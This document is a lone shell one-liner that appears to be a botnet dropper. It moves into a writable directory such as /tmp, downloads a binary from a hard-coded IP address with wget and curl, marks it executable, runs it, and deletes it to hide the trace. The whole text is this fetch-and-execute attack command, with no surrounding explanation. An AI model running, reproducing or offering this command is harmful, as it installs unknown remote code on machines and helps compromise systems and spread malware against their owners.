cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.39.162/wget; curl -O http://51.15.39.162/wget; chmod +x wget; ./wget; rm -rf wget
